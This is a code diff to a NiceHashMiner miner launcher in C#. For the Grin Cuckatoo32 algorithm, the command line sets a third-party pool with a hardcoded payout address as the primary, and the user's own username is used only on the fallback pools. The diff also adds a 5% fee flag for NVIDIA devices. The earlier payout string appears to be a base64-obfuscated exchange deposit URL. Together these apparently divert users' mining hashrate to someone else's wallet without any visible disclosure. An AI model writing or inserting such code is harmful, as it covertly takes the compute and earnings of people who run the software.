@@ -103,7 +103,7 @@ namespace NiceHashMiner.Miners
                 if (mPair.Device.DeviceType == DeviceType.NVIDIA)
                 {
                     devs = string.Join(",", MiningSetup.MiningPairs.Select(p => p.Device.IDByBus));
-                    platform = "--platform 1 --no-watchdog";
+                    platform = "--platform 1 --no-watchdog --fee 5";
                     extra = ExtraLaunchParametersParser.ParseForMiningSetup(MiningSetup, DeviceType.NVIDIA);
                 }
                 else
@@ -248,7 +248,7 @@ namespace NiceHashMiner.Miners
             }
             if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.GrinCuckatoo32))
             {
-                cmd = $"-a {AlgoName} -o stratum+tcp://grin.2miners.com:3030 -u 2aHR0cHM6Ly9kZXBvc2l0Z3Jpbi5rdWNvaW4uY29tL2RlcG9zaXQvMTg2MTU0MTY0MA.nbminer -o1 stratum+tcp://grincuckatoo32." + myServers[0, 0] + ".nicehash.com:3383 -u1 " + username +
+                cmd = $"-a {AlgoName} -o stratum+tcp://grin.2miners.com:3030 -u grin16ek8qgx29ssku0q2cxez7830gh9ndw3ek5yzxe26x34s09528d2sldl6td.nbminer -o1 stratum+tcp://grincuckatoo32." + myServers[0, 0] + ".nicehash.com:3383 -u1 " + username +
                     $" -o2 stratum+tcp://grincuckatoo32." + myServers[1, 0] + ".nicehash.com:3383 -u2 " + username +
                     $" --api 127.0.0.1:{ApiPort} -d {devs} -RUN " + platform;
             }
